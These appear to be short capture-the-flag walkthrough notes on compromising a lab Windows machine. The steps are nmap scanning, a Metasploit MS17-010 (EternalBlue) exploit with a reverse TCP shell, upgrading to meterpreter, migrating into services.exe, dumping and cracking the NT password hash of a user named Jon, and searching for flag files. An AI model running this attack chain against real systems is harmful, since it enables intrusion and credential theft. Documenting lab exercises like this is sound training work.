IP : 10.10.118.25

NMAP : sudo nmap -sV -sC -A -O -T4 10.10.118.25 > nmap.txt

NMAP : sudo nmap --script vuln 10.10.118.25  

Here I found Machine is Windows and it is vulnerable to MS17_010 RCE
> Host script results:
![image](https://github.com/MrKeral/Offensive-Pentesting-OSCP/assets/82687464/06efa503-58f6-4cbc-bc3e-93412c7e1ef2)

> msfconsole \n
search ms17_010
use 0
set rhost 10.10.118.25
set lhost LOCAL-IP
set payload windows/x64/shell/reverse_tcp
exploit

> Here I got the shell
C:\Windows\system32>whoami
whoami
nt authority\system

CTRL + Z for run session in background

> Here I set the shell to meterpreter
search shell_to_meterpreter
use 0 
set lhost LOCAL-IP
set session 1
exploit
session -i 2        # for meterpreter shell

> Check  NT AUTHORITY\SYSTEM or not by using getsystem and getuid. I'm running as system but that doesn’t indicate that our process is. I need to migrate to another process. Generally we use services.exe
migrate 692

> Now check for Hashes
hashdump

> Here I found Jon user with password hash.
echo "Jon:1000:dfzhdfhdxghsfghjfxgjfjxfgjxfgjx:fgjxfgjxfgjxfgjhfghdg:::" > hash
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash

> Password is alqfna22

> Now search for Flags
search -f flag*.txt